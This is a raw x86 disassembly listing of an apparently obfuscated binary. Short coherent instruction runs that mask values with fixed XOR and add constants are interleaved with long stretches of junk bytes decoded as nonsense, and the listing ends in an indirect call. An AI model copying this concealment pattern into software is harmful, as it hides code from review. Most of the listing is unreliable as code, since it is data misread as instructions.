  410aaa:	fbstp  TBYTE PTR ds:0x562f24e3
  410ab0:	mov    esp,DWORD PTR [edx+0x3b2eb27a]
  410ab6:	imul   DWORD PTR [edx+0x2f5b15eb]
  410abc:	add    DWORD PTR [esp+edi*1-0x27],eax
  410ac0:	les    eax,FWORD PTR [edi-0x35]
  410ac3:	pop    ebx
  410ac4:	and    eax,0x45037a9f
  410ac9:	or     BYTE PTR [ecx+0x458bf045],cl
  410acf:	in     al,0x85
  410ad1:	ror    BYTE PTR [edi],0x84
  410ad4:	mov    dh,0x5
  410ad6:	add    BYTE PTR [eax],al
  410ad8:	mov    DWORD PTR [ebp-0x24],esi
  410adb:	push   0xb
  410add:	pop    ecx
  410ade:	push   0x5
  410ae0:	jmp    0x410c1b
  410ae5:	jbe    0x410ad6
  410ae7:	inc    edi
  410ae8:	xchg   DWORD PTR [ecx-0x49],eax
  410aeb:	jbe    0x410ad6
  410aed:	and    al,0x2e
  410aef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410af0:	fmul   QWORD PTR [ebx+0x11b5b7de]
  410af6:	inc    ebp
  410af7:	jl     0x410b75
  410af9:	adc    bh,BYTE PTR [edi+0x7c]
  410afc:	jl     0x410b1d
  410afe:	dec    ecx
  410aff:	in     eax,0xdf
  410b01:	outs   dx,DWORD PTR ds:[esi]
  410b02:	cmp    edi,DWORD PTR ds:0xa275cbf0
  410b08:	jl     0x410acb
  410b0a:	or     edi,DWORD PTR [ebx]
  410b0c:	test   ah,dh
  410b0e:	lds    edi,FWORD PTR [edx-0x3a029386]
  410b14:	mov    BYTE PTR [esp+eax*1+0x43],ch
  410b18:	dec    ebp
  410b19:	inc    edi
  410b1a:	inc    ecx
  410b1b:	cmp    al,0x6
  410b1d:	mov    ebx,DWORD PTR ds:0xac6d13b7
  410b23:	(bad)  
  410b24:	mov    ebx,0x6bea6612
  410b29:	pop    ss
  410b2a:	mov    ebx,0xbcf06b40
  410b2f:	rol    DWORD PTR [ebp+0x1c],1
  410b32:	(bad)  [eax+esi*1-0x19]
  410b36:	dec    esp
  410b37:	lea    ebp,[ecx*1-0x1c4e5c30]
  410b3e:	add    ecx,ecx
  410b40:	or     eax,0xb0d5a0f2
  410b45:	leave  
  410b46:	jmp    0x77c6c498
  410b4b:	aas    
  410b4c:	xchg   edx,eax
  410b4d:	arpl   WORD PTR [ebp+0x72b0144d],sp
  410b53:	sbb    eax,0x79dbe724
  410b58:	out    0x45,eax
  410b5a:	mov    WORD PTR [edx],?
  410b5c:	inc    ebp
  410b5d:	clc    
  410b5e:	jb     0x410afe
  410b60:	mov    esp,0xe2a31ac0
  410b65:	mov    ah,0x81
  410b67:	jl     0x410bac
  410b69:	mov    ds:0xf816595a,eax
  410b6e:	dec    DWORD PTR [esi+0x3f91805b]
  410b74:	dec    eax
  410b75:	daa    
  410b76:	mov    dh,bh
  410b78:	adc    DWORD PTR ds:0x7510a065,0x7086a09f
  410b82:	jmp    0x24da:0xb9b3a14e
  410b89:	fwait
  410b8a:	das    
  410b8b:	cmp    ebx,esi
  410b8d:	sub    bh,BYTE PTR [esi-0x175df772]
  410b93:	mov    edi,DWORD PTR [ecx+0x3c45fb66]
  410b99:	(bad)  
  410b9b:	nop
  410b9c:	jmp    0xd921243d
  410ba1:	mov    dl,0x61
  410ba3:	dec    edi
  410ba4:	push   cs
  410ba5:	sar    BYTE PTR [edi+0x20],cl
  410ba8:	pop    edi
  410ba9:	jae    0x410b47
  410bab:	cmp    DWORD PTR ds:0x76494d79,edi
  410bb1:	inc    eax
  410bb2:	rol    BYTE PTR [ebp-0x3770251c],1
  410bb8:	xchg   ebp,eax
  410bb9:	xchg   esp,eax
  410bba:	rcr    DWORD PTR [esi+0x48],1
  410bbd:	mov    ds:0x80332b4d,al
  410bc2:	int3   
  410bc3:	enter  0x43d9,0x97
  410bc7:	cld    
  410bc8:	mov    WORD PTR [edx-0x6bfe7b33],?
  410bce:	fisttp DWORD PTR [esi]
  410bd0:	ins    DWORD PTR es:[edi],dx
  410bd1:	sub    bl,BYTE PTR [edx-0x334dc9e8]
  410bd7:	add    esp,ebp
  410bd9:	add    dl,BYTE PTR [ecx-0x13660574]
  410bdf:	and    eax,0xde5fc317
  410be4:	ror    esp,cl
  410be6:	xchg   DWORD PTR [edi+0x78],ebp
  410be9:	and    ebx,0x79e0c84
  410bef:	mov    ch,BYTE PTR [ebp-0x6396380f]
  410bf5:	push   ds
  410bf6:	(bad)  
  410bf7:	xchg   ebx,eax
  410bf8:	cmp    cl,bh
  410bfa:	xchg   esp,eax
  410bfb:	loope  0x410c72
  410bfd:	leave  
  410bfe:	push   eax
  410bff:	outs   dx,BYTE PTR ds:[esi]
  410c00:	fwait
  410c01:	repz cmp ebx,DWORD PTR [esi-0x46d9672f]
  410c08:	test   al,0x8e
  410c0a:	les    eax,FWORD PTR [esi+0x402b3a30]
  410c10:	pusha  
  410c11:	jmp    0x410c57
  410c13:	pop    es
  410c14:	nop
  410c15:	cs gs mov dl,0x5d
  410c19:	adc    edi,ebp
  410c1b:	dec    ecx
  410c1c:	pop    ebx
  410c1d:	xchg   ebx,ecx
  410c1f:	sub    ebx,ecx
  410c21:	xchg   ebx,ecx
  410c23:	dec    ecx
  410c24:	mov    eax,DWORD PTR [ebp-0x1c]
  410c27:	imul   eax,ecx
  410c2a:	sub    esp,eax
  410c2c:	mov    DWORD PTR [ebp-0x24],esp
  410c2f:	mov    eax,DWORD PTR [ebp-0x4]
  410c32:	mov    ecx,0x7510853
  410c37:	xor    eax,ecx
  410c39:	mov    edx,0x32729a
  410c3e:	add    eax,edx
  410c40:	mov    DWORD PTR [ebp+0x8],eax
  410c43:	mov    eax,DWORD PTR [ebp-0x18]
  410c46:	xor    eax,ecx
  410c48:	add    eax,edx
  410c4a:	mov    edx,DWORD PTR [ebp+0x14]
  410c4d:	imul   eax,DWORD PTR [edx]
  410c50:	mov    edx,DWORD PTR [ebp-0x4]
  410c53:	xor    edx,ecx
  410c55:	mov    ecx,DWORD PTR [ebp+0x8]
  410c58:	lea    ecx,[edx+ecx*1+0x32729a]
  410c5f:	cmp    ecx,eax
  410c61:	je     0x411089
  410c67:	mov    edi,DWORD PTR [ebp-0x18]
  410c6a:	mov    eax,DWORD PTR [ebp+0x8]
  410c6d:	mov    edx,DWORD PTR [ebp+0x14]
  410c70:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  410c74:	jmp    0x410daf
  410c79:	sbb    DWORD PTR [eax+0x31],0x6d5dfd4a
  410c80:	jae    0x410c66
  410c82:	jb     0x410c33
  410c84:	pop    ds
  410c85:	inc    edx
  410c86:	stc    
  410c87:	ret    
  410c88:	or     esi,DWORD PTR [edi]
  410c8a:	inc    esp
  410c8b:	jl     0x410d09
  410c8d:	adc    bh,BYTE PTR [edi+0x7c]
  410c90:	jl     0x410d08
  410c92:	clc    
  410c93:	out    0x33,eax
  410c95:	shl    bh,1
  410c97:	or     bh,BYTE PTR [ebx-0x5e]
  410c9a:	and    eax,0xd8e0bfbf
  410c9f:	rcl    BYTE PTR [ebx+0x7f],0xc4
  410ca3:	cmp    BYTE PTR [esi-0x59],cl
  410ca6:	setne  BYTE PTR [edx-0x59]
  410caa:	cld    
  410cab:	add    eax,0xff18b1f4
  410cb0:	stos   DWORD PTR es:[edi],eax
  410cb1:	out    dx,eax
  410cb2:	adc    esp,DWORD PTR [ebp+0x16]
  410cb5:	sbb    bh,al
  410cb7:	js     0x410c87
  410cb9:	dec    ebx
  410cba:	sbb    DWORD PTR [eax+0x2fc56249],esi
  410cc0:	ins    DWORD PTR es:[edi],dx
  410cc1:	add    edx,DWORD PTR [ebp+0x75]
  410cc4:	mov    eax,0x4600d73a
  410cc9:	lods   eax,DWORD PTR ds:[esi]
  410cca:	and    ebp,DWORD PTR [edx-0x9d34cf1]
  410cd0:	test   esp,edx
  410cd2:	ficomp DWORD PTR [ebp-0x2]
  410cd5:	inc    edi
  410cd6:	jns    0x410d19
  410cd8:	fdiv   QWORD PTR [esi]
  410cda:	jo     0x410c8a
  410cdc:	imul   esp,DWORD PTR [edi-0x4],0xa3891ae7
  410ce3:	jge    0x410c8c
  410ce5:	add    al,0x68
  410ce7:	aam    0x7d
  410ce9:	adc    eax,0xac6f72e9
  410cee:	dec    ecx
  410cef:	and    BYTE PTR [edi+0x6f75aba4],al
  410cf5:	data16 xor BYTE PTR [ebp+0x43],dh
  410cf9:	je     0x410c7b
  410cfb:	sub    BYTE PTR ss:[bp+si+0x4a33],ch
  410d01:	cmp    ebp,edi
  410d03:	mov    dh,0xd8
  410d05:	dec    edx
  410d06:	jbe    0x410d5b
  410d08:	(bad)  [edi]
  410d0a:	dec    ebp
  410d0b:	ret    
  410d0c:	push   edx
  410d0d:	jp     0x410d81
  410d0f:	sub    ecx,DWORD PTR [edx+ebx*1-0x7e]
  410d13:	cmp    al,0xf0
  410d15:	mov    ds:0x12749b10,al
  410d1a:	das    
  410d1b:	(bad)  
  410d1c:	stos   DWORD PTR es:[edi],eax
  410d1d:	sti    
  410d1e:	je     0x410d6d
  410d20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d21:	cmp    al,0xea
  410d23:	mov    dh,0x5e
  410d25:	mov    eax,0x1930a967
  410d2a:	cmp    esp,edi
  410d2c:	gs scas al,BYTE PTR es:[edi]
  410d2e:	ins    DWORD PTR es:[edi],dx
  410d2f:	out    0x7,eax
  410d31:	pop    es
  410d32:	add    BYTE PTR [edx],al
  410d34:	popa   
  410d35:	lds    edx,FWORD PTR [edi]
  410d37:	push   es
  410d38:	imul   esi,eax,0x76
  410d3b:	inc    ecx
  410d3c:	and    BYTE PTR [edx+0x2d],al
  410d3f:	mov    dh,0xe0
  410d41:	push   es
  410d42:	shr    BYTE PTR [eax+0x7b],1
  410d45:	cmc    
  410d46:	test   bh,0xb6
  410d49:	cli    
  410d4a:	es hlt 
  410d4c:	fwait
  410d4d:	adc    edx,esp
  410d4f:	and    cl,BYTE PTR [ebx]
  410d51:	std    
  410d52:	pop    edx
  410d53:	lea    esp,[ecx]
  410d55:	sub    edx,DWORD PTR [eax+0x63]
  410d58:	push   ss
  410d59:	mov    ecx,0x89092fff
  410d5e:	arpl   WORD PTR [edi],ax
  410d60:	repnz xchg ebx,eax
  410d62:	lea    eax,[eax+0x19]
  410d65:	pop    ss
  410d66:	(bad)  
  410d67:	push   ebp
  410d68:	lea    edi,[edi-0x635e14d7]
  410d6e:	xor    DWORD PTR [ebp*4-0x154a1051],esp
  410d75:	mov    eax,ds:0x1640228d
  410d7a:	out    0xd8,eax
  410d7c:	cmp    edx,edx
  410d7e:	out    dx,al
  410d7f:	hlt    
  410d80:	enter  0x6987,0x8a
  410d84:	shl    esp,0xd3
  410d87:	pop    ebp
  410d88:	addr16 jge 0x410d52
  410d8b:	cmp    eax,0xa969d539
  410d90:	(bad)  
  410d92:	(bad)  
  410d93:	dec    ebp
  410d94:	in     al,0x60
  410d96:	dec    ebp
  410d97:	mov    dl,BYTE PTR [esi-0x2fa221e2]
  410d9d:	ret    0x339c
  410da0:	mov    bl,0x58
  410da2:	xchg   BYTE PTR [eax+edi*8+0xa13dddf],bl
  410da9:	cmp    al,0xbf
  410dab:	addr16 xor eax,0x53b98b71
  410db1:	or     BYTE PTR [ecx+0x7],dl
  410db4:	xor    edx,edx
  410db6:	xor    edi,ecx
  410db8:	mov    esi,0x32729a
  410dbd:	add    edi,esi
  410dbf:	div    edi
  410dc1:	mov    edx,DWORD PTR [ebp-0x4]
  410dc4:	xor    edx,ecx
  410dc6:	lea    eax,[edx+eax*1+0x32729a]
  410dcd:	mov    edx,DWORD PTR [ebp+0x8]
  410dd0:	mov    edi,DWORD PTR [ebp-0x24]
  410dd3:	mov    DWORD PTR [edi+edx*4],eax
  410dd6:	mov    eax,DWORD PTR [ebp-0x18]
  410dd9:	mov    edx,DWORD PTR [ebp+0x8]
  410ddc:	xor    eax,ecx
  410dde:	lea    eax,[eax+edx*1+0x32729a]
  410de5:	mov    DWORD PTR [ebp+0x8],eax
  410de8:	mov    eax,DWORD PTR [ebp-0x18]
  410deb:	mov    edx,DWORD PTR [ebp+0x14]
  410dee:	xor    eax,ecx
  410df0:	jmp    0x410f2b
  410df5:	mov    ch,0xd5
  410df7:	or     dh,dh
  410df9:	push   0xd05d7df1
  410dfe:	sbb    DWORD PTR [ebx-0x119d9100],esi
  410e04:	rcl    ch,0x47
  410e07:	jl     0x410e85
  410e09:	adc    bh,BYTE PTR [edi+0x7c]
  410e0c:	jl     0x410dec
  410e0e:	pop    esp
  410e0f:	mov    DWORD PTR [edx-0x2076b8f0],esi
  410e15:	pop    ecx
  410e16:	dec    ebp
  410e17:	cdq    
  410e18:	ss dec ecx
  410e1a:	outs   dx,BYTE PTR ds:[esi]
  410e1b:	and    ecx,DWORD PTR [ebx+0x55]
  410e1e:	adc    DWORD PTR [edx],ebp
  410e20:	mov    al,ds:0x245cb8fa
  410e25:	adc    ah,bl
  410e27:	cli    
  410e28:	adc    al,0x90
  410e2a:	inc    ebx
  410e2b:	not    DWORD PTR [esi]
  410e2d:	aas    
  410e2e:	dec    ecx
  410e2f:	dec    ebp
  410e30:	mov    ebp,0x83675755
  410e35:	leave  
  410e36:	mov    eax,0x6fc2efa
  410e3b:	bound  esi,QWORD PTR [edx]
  410e3d:	pop    edx
  410e3e:	(bad)  
  410e3f:	jge    0x410e2a
  410e41:	fdivr  QWORD PTR [eax+0x753edaac]
  410e47:	test   eax,0x98b710b5
  410e4c:	push   edi
  410e4d:	sbb    BYTE PTR [eax+0x68],ah
  410e50:	mov    ecx,0xd1717a7a
  410e55:	xchg   ecx,eax
  410e56:	(bad)  
  410e58:	retf   
  410e59:	adc    al,0x24
  410e5b:	push   ecx
  410e5c:	mov    dl,0xa6
  410e5e:	enter  0x75e8,0x7e
  410e62:	(bad)  
  410e63:	mov    ch,0x25
  410e65:	or     al,0xb1
  410e67:	(bad)  
  410e68:	(bad)  
  410e69:	es inc ecx
  410e6b:	or     eax,0x49fa84aa
  410e70:	call   0x82886366
  410e75:	adc    DWORD PTR [edx-0x62ff6f5b],ecx
  410e7b:	sub    ch,BYTE PTR [esi]
  410e7d:	mov    ah,0x5
  410e7f:	clc    
  410e80:	mov    BYTE PTR [edx+0x5733c6d],ah
  410e86:	lods   al,BYTE PTR ds:[esi]
  410e87:	cmp    DWORD PTR [esi+0x18a375c2],ebx
  410e8d:	ret    
  410e8e:	das    
  410e8f:	sar    BYTE PTR [edx+eiz*2+0x69],0xc2
  410e94:	sbb    al,dl
  410e96:	mov    cl,bl
  410e98:	push   es
  410e99:	xor    edi,DWORD PTR [esi+0xc238088]
  410e9f:	xchg   esi,eax
  410ea0:	jg     0x410ef5
  410ea2:	jnp    0x410e8d
  410ea4:	outs   dx,BYTE PTR ds:[esi]
  410ea5:	or     al,BYTE PTR [ecx-0x38]
  410ea8:	nop
  410ea9:	into   
  410eaa:	pop    ebx
  410eab:	cmc    
  410eac:	dec    edx
  410ead:	mov    DWORD PTR [ebx+0x11213a23],edi
  410eb3:	dec    ecx
  410eb4:	sub    cl,ch
  410eb6:	aas    
  410eb7:	loop   0x410e41
  410eb9:	dec    ebx
  410eba:	add    DWORD PTR [eax-0x12],0x2629b03f
  410ec1:	add    al,0x29
  410ec3:	ret    0xe5cc
  410ec6:	lods   eax,DWORD PTR es:[esi]
  410ec8:	mov    dl,0x9a
  410eca:	mov    ?,esp
  410ecc:	inc    ecx
  410ecd:	xor    BYTE PTR [edx-0x5a143f32],ch
  410ed3:	and    esp,DWORD PTR [ebx+ecx*8]
  410ed6:	icebp  
  410ed7:	outs   dx,BYTE PTR ds:[esi]
  410ed8:	pop    es
  410ed9:	mov    bl,0x1d
  410edb:	or     eax,DWORD PTR cs:[edi]
  410ede:	pop    edx
  410edf:	adc    dh,cl
  410ee1:	xor    DWORD PTR [edi-0x4f61bf50],0xffffff8d
  410ee8:	sbb    eax,0xa9c192e7
  410eed:	add    DWORD PTR [esi],esi
  410eef:	in     al,dx
  410ef0:	lahf   
  410ef1:	imul   ecx,ecx,0x31
  410ef4:	mov    eax,0xecd45421
  410ef9:	test   BYTE PTR [edi-0x6442e62b],ch
  410eff:	or     eax,0xb9ef9c27
  410f04:	mov    ?,WORD PTR [eax]
  410f06:	scas   eax,DWORD PTR es:[edi]
  410f07:	in     al,0x87
  410f09:	inc    esi
  410f0a:	test   BYTE PTR [ebx],0xf4
  410f0d:	xor    bh,0x58
  410f10:	loope  0x410f62
  410f12:	mov    edx,0x6e1f8005
  410f17:	fmul   st(2),st
  410f19:	aaa    
  410f1a:	mov    ecx,0x8797857c
  410f1f:	outs   dx,DWORD PTR ds:[esi]
  410f20:	jmp    FWORD PTR [ebp+0x255de463]
  410f26:	jl     0x410f33
  410f28:	dec    ebp
  410f29:	cmp    eax,0xfc603fc
  410f2e:	scas   eax,DWORD PTR es:[edi]
  410f2f:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  410f35:	mov    ecx,DWORD PTR [ebp+0x8]
  410f38:	jmp    0x411073
  410f3d:	pop    eax
  410f3e:	shl    BYTE PTR [ebp+0x13],0x7d
  410f42:	mov    ebp,0x8c3c7362
  410f47:	cmp    cl,al
  410f49:	dec    eax
  410f4a:	in     eax,0xe3
  410f4c:	mov    eax,0x7c7c46eb
  410f51:	adc    bh,BYTE PTR [edi+0x7c]
  410f54:	jl     0x410f89
  410f56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f57:	scas   eax,DWORD PTR es:[edi]
  410f58:	loop   0x410f8f
  410f5a:	push   edi
  410f5b:	test   DWORD PTR [eax],edx
  410f5d:	aad    0x52
  410f5f:	(bad)  
  410f61:	xor    BYTE PTR [esi+0x5a0e6a2e],ch
  410f67:	(bad)  
  410f69:	sbb    BYTE PTR [edx+0x257d3102],bh
  410f6f:	xor    al,0x6c
  410f71:	pop    ss
  410f72:	mov    DWORD PTR [eax+ecx*8+0x14],edx
  410f76:	pusha  
  410f77:	scas   eax,DWORD PTR es:[edi]
  410f78:	sbb    eax,0x4d7cb305
  410f7d:	call   FWORD PTR [ebp+0x4164f7fb]
  410f83:	adc    DWORD PTR [ebp+0x7d],esp
  410f86:	in     al,dx
  410f87:	outs   dx,DWORD PTR ds:[esi]
  410f88:	mov    eax,ds:0x9f699a2d
  410f8d:	sbb    BYTE PTR [edi-0x3d],dh
  410f90:	xor    DWORD PTR [edx-0xf2f7687],ebx
  410f96:	aad    0xfd
  410f98:	adc    DWORD PTR [ecx],ecx
  410f9a:	push   ebp
  410f9b:	mov    ebx,0xb3147fb1
  410fa0:	inc    ebx
  410fa1:	lock sub edx,DWORD PTR [esp+eax*8-0x49]
  410fa6:	clc    
  410fa7:	mov    ebp,0x56aae5ee
  410fac:	and    al,0x15
  410fae:	mov    ah,0xab
  410fb0:	nop
  410fb1:	jl     0x411017
  410fb3:	repnz xchg ebx,eax
  410fb5:	dec    eax
  410fb6:	jo     0x411035
  410fb8:	mov    ebp,0x368dccb1
  410fbd:	adc    BYTE PTR [edx+0x704e6ff1],0x79
  410fc4:	call   0xfd6f:0x5661fc92
  410fcb:	mov    BYTE PTR [ebx],ch
  410fcd:	ud2    
  410fcf:	add    DWORD PTR [edi+0x7c11bfa7],ebp
  410fd5:	pop    ecx
  410fd6:	ss push cs
  410fd8:	ss stos DWORD PTR es:[edi],eax
  410fda:	fnstenv [esi]
  410fdc:	fcom   QWORD PTR [edi+ecx*4+0x15930c8b]
  410fe3:	or     DWORD PTR [eax],0x62
  410fe6:	cmp    BYTE PTR [ebp-0x53],ah
  410fe9:	fild   DWORD PTR [esi]
  410feb:	inc    edx
  410fec:	sbb    ecx,ecx
  410fee:	sahf   
  410fef:	lds    ecx,FWORD PTR [edi-0x399f3bc2]
  410ff5:	imul   BYTE PTR [esi+0x28]
  410ff8:	or     eax,0x417d2e23
  410ffd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ffe:	out    dx,al
  410fff:	ja     0x411061
  411001:	add    al,bl
  411003:	iret   
  411004:	ror    DWORD PTR [esp+eiz*2-0x50],cl
  411008:	sbb    eax,0x28593154
  41100d:	aas    
  41100e:	mov    al,0x5
  411010:	(bad)  
  411011:	adc    eax,0x806f33db
  411016:	call   0xbd7fbc09
  41101b:	ds xchg edx,eax
  41101d:	or     al,0x10
  41101f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411020:	in     al,dx
  411021:	je     0x410fe6
  411023:	jge    0x410fec
  411025:	lahf   
  411026:	andps  xmm6,XMMWORD PTR [eax]
  411029:	popf   
  41102a:	sbb    eax,0xef1af67e
  41102f:	ror    DWORD PTR [edx+ebp*4+0x4fdaeee3],cl
  411036:	sbb    al,BYTE PTR [ebp-0xbf52092]
  41103c:	shr    BYTE PTR [eax+eiz*1-0x34bf7b54],cl
  411043:	mov    edx,0xb1f1c901
  411048:	xor    DWORD PTR [edi-0xd1b676b],esi
  41104e:	and    al,0x41
  411050:	int    0x67
  411052:	in     eax,0x20
  411054:	gs cwde 
  411056:	add    ecx,DWORD PTR [eax+0x78]
  411059:	push   DWORD PTR [edx-0x72a3937e]
  41105f:	sub    BYTE PTR [esi],bl
  411061:	pushf  
  411062:	fstp   DWORD PTR [esi-0x4e]
  411065:	cmp    al,BYTE PTR [esi]
  411067:	add    bh,ch
  411069:	mov    ch,0xe6
  41106b:	call   0x5eed:0x2f51a7c1
  411072:	sbb    cl,BYTE PTR [ebp+0x729a0a8c]
  411078:	xor    al,BYTE PTR [eax]
  41107a:	cmp    ecx,eax
  41107c:	jne    0x410c67
  411082:	mov    ebx,esi
  411084:	jmp    0x41108e
  411089:	mov    ebx,0x32729a
  41108e:	mov    eax,DWORD PTR [ebp-0x4]
  411091:	xor    eax,0x7510853
  411096:	add    eax,ebx
  411098:	mov    DWORD PTR [ebp-0xc],eax
  41109b:	xor    ebx,ebx
  41109d:	lea    eax,[ebp-0x10]
  4110a0:	jmp    0x4111db
  4110a5:	into   
  4110a6:	aas    
  4110a7:	in     eax,0x49
  4110a9:	cmc    
  4110aa:	jne    0x411116
  4110ac:	mov    edi,0x9e11fbf4
  4110b1:	iret   
  4110b2:	mov    eax,0x41897b65
  4110b7:	jl     0x411135
  4110b9:	adc    bh,BYTE PTR [edi+0x7c]
  4110bc:	jl     0x41112e
  4110be:	cmp    eax,0xba8be36e
  4110c3:	(bad)  
  4110c4:	ja     0x4110af
  4110c6:	jp     0x411140
  4110c8:	dec    esp
  4110c9:	repz mov ebp,0xf666a262
  4110cf:	jmp    0x8001a43e
  4110d4:	add    eax,0xe85bc1
  4110d9:	shl    BYTE PTR [ebp+0x2],cl
  4110dc:	pop    esi
  4110dd:	(bad)
  4110e0:	sti    
  4110e1:	cmp    eax,0x32d18c2d
  4110e6:	and    BYTE PTR [eax],cl
  4110e8:	cpuid  
  4110ea:	popf   
  4110eb:	sub    ecx,DWORD PTR cs:[ecx-0x59]
  4110ef:	addr16 leave 
  4110f1:	imul   esp,DWORD PTR [ecx],0xffffff9b
  4110f4:	mov    BYTE PTR [edx+0x67],bl
  4110f7:	sbb    ah,BYTE PTR [ebx-0x21]
  4110fa:	jbe    0x41113b
  4110fc:	inc    ebx
  4110fd:	mov    bl,0x9d
  4110ff:	xchg   esp,eax
  411100:	push   ebx
  411101:	xadd   DWORD PTR [edx-0x76],eax
  411105:	mov    edx,0xfde1518d
  41110a:	jo     0x411121
  41110c:	ror    DWORD PTR [edx+0x3e],cl
  41110f:	gs je  0x41116b
  411112:	pop    ecx
  411113:	pop    esi
  411114:	jg     0x411106
  411116:	push   ds
  411117:	outs   dx,BYTE PTR ds:[esi]
  411118:	jns    0x4110b1
  41111a:	mov    ds:0x972291af,eax
  41111f:	sahf   
  411120:	mov    BYTE PTR [ebp-0x7bb3bfc9],cl
  411126:	jmp    0x2a8f:0x41d10bf
  41112d:	mov    bh,0xda
  41112f:	inc    ebp
  411130:	loopne 0x41111c
  411132:	mov    ?,WORD PTR [eax+edi*8-0x26229a7c]
  411139:	or     edx,ebp
  41113b:	in     eax,dx
  41113c:	cdq    
  41113d:	push   esi
  41113e:	cld    
  41113f:	adc    dl,ah
  411141:	adc    ecx,DWORD PTR [esi-0x16]
  411144:	xor    eax,0x5dbda2d7
  411149:	fist   DWORD PTR [esi]
  41114b:	lods   eax,DWORD PTR ds:[esi]
  41114d:	clc    
  41114e:	mov    bl,0x9c
  411150:	loop   0x41111f
  411152:	inc    ecx
  411153:	lahf   
  411154:	aaa    
  411155:	cmp    al,0x88
  411157:	and    al,0xa0
  411159:	mov    ebp,0x484dd253
  41115e:	shl    edx,cl
  411160:	addr16 dec esp
  411162:	cmp    BYTE PTR [ebx],dl
  411164:	mov    ah,BYTE PTR [ebp-0x42]
  411167:	clc    
  411168:	mul    BYTE PTR [edi+ebx*2+0x6f86e4c1]
  41116f:	mov    eax,0x7f120db9
  411174:	jmp    0xcdeb43b0
  411179:	and    eax,DWORD PTR [edx+0x7466460d]
  41117f:	adc    ah,cl
  411181:	repz pop esi
  411183:	mov    edi,0x27918784
  411188:	or     DWORD PTR [ebx-0x5c47d463],edi
  41118e:	scas   al,BYTE PTR es:[edi]
  41118f:	inc    esi
  411190:	mov    ds:0x34f60844,al
  411195:	xchg   esp,eax
  411196:	mov    bl,bh
  411198:	outs   dx,BYTE PTR ds:[esi]
  411199:	and    ecx,ebp
  41119b:	dec    ecx
  41119c:	push   edx
  41119d:	mov    ebp,0xef5fda00
  4111a2:	pusha  
  4111a3:	push   esi
  4111a4:	inc    edi
  4111a5:	add    al,0x52
  4111a7:	sbb    BYTE PTR ds:0x4250338f,ch
  4111ad:	div    DWORD PTR [ebp-0x544e1b00]
  4111b3:	addr16 ja 0x4111e4
  4111b6:	cmc    
  4111b7:	jo     0x411201
  4111b9:	es jno 0x4111c6
  4111bc:	xchg   edx,eax
  4111bd:	mov    edi,0x50e18305
  4111c2:	stos   DWORD PTR es:[edi],eax
  4111c3:	lods   al,BYTE PTR ds:[esi]
  4111c4:	mov    ebx,ebp
  4111c6:	or     al,BYTE PTR [ecx]
  4111c8:	fcmovnb st,st(4)
  4111ca:	mov    DWORD PTR [ebx],ecx
  4111cc:	sbb    dl,al
  4111ce:	jmp    FWORD PTR [edx+0x7e]
  4111d1:	sbb    DWORD PTR [eax-0x3ad7aefb],0x2e
  4111d8:	adc    BYTE PTR [eax],bh
  4111da:	pop    es
  4111db:	add    ebx,DWORD PTR [eax]
  4111dd:	call   ebx
  4111df:	xor    ebx,ebx
  4111e1:	inc    ebx
  4111e2:	cmp    DWORD PTR [ebp+0x10],ebx
  4111e5:	je     0x41133e
  4111eb:	xchg   edx,eax
  4111ec:	jmp    0x411327
  4111f1:	push   ecx
  4111f2:	(bad)  
  4111f3:	fsub   st(2),st
  4111f5:	imul   esi,edx,0x2efa635d
  4111fb:	enter  0xed5a,0x5c
  4111ff:	sbb    ebp,DWORD PTR [edi+ebp*4+0x127c7c40]
  411206:	jg     0x411284
  411208:	jl     0x41123f
  41120a:	repnz push ecx
  41120c:	and    DWORD PTR [ebp-0x65],edx
  41120f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411210:	mov    ah,0x27
  411212:	int3   
  411213:	jb     0x411218
  411215:	js     0x4111b1
  411217:	inc    esi
  411218:	loopne 0x411202
  41121a:	neg    bl
  41121c:	daa    
  41121d:	out    0x60,al
  41121f:	mov    cl,0x6a
  411221:	outs   dx,BYTE PTR ds:[esi]
  411222:	cmp    cl,BYTE PTR [edi+0x46]
  411225:	sbb    dl,BYTE PTR [bx+si]
  411228:	mov    al,ds:0x9f39ba51
  41122d:	loop   0x411293
  41122f:	adc    DWORD PTR [eax-0xc8004c0],ecx
  411235:	scas   al,BYTE PTR es:[edi]
  411236:	push   esp
  411237:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411238:	lock jnp 0x4111e7
  41123b:	or     al,0xa5
  41123d:	jne    0x4111bf
  41123f:	ret    
  411240:	mov    eax,ds:0x1eb20b51
  411245:	pop    ds
  411246:	mov    ch,0xfd
  411248:	jecxz  0x4112ac
  41124a:	cdq    
  41124b:	fdivr  DWORD PTR [esi+edx*1+0x6b9aba4f]
  411252:	mov    ah,0x9c
  411254:	repz dec ecx
  411256:	push   0x6203bdad
  41125b:	xchg   DWORD PTR [edx-0x5f8396f5],esp
  411261:	mov    edi,esi
  411263:	test   WORD PTR es:[edx],bx
  411267:	ja     0x411218
  411269:	out    dx,al
  41126a:	jle    0x4112d5
  41126c:	bound  eax,QWORD PTR [edx-0x70159524]
  411272:	jo     0x411238
  411274:	icebp  
  411275:	inc    esi
  411276:	add    ch,BYTE PTR [edx-0x24]
  411279:	mov    cl,0xa9
  41127b:	add    bh,BYTE PTR ds:0x4eac29fb
  411281:	cwde   
  411282:	adc    DWORD PTR [ecx],esp
  411284:	xor    esp,DWORD PTR [edi]
  411286:	popa   
  411287:	fdiv   QWORD PTR [eax]
  411289:	xchg   esp,eax
  41128a:	dec    ecx
  41128b:	pop    ebx
  41128c:	jmp    0xa8792a15
  411291:	scas   al,BYTE PTR es:[edi]
  411292:	loopne 0x4112b0
  411294:	mov    cl,0x4a
  411296:	inc    ebx
  411297:	imul   ecx,DWORD PTR [ebp+0x401fd39c],0x408acaa1
  4112a1:	and    al,0x5a
  4112a3:	xor    al,0x7
  4112a5:	daa    
  4112a6:	stos   DWORD PTR es:[edi],eax
  4112a7:	gs push es
  4112a9:	jecxz  0x41126b
  4112ab:	sbb    ah,dh
  4112ad:	adc    al,0xb9
  4112af:	xchg   edi,eax
  4112b0:	scas   al,BYTE PTR es:[edi]
  4112b1:	rcl    BYTE PTR [eax+0x3950bcc7],0xb1
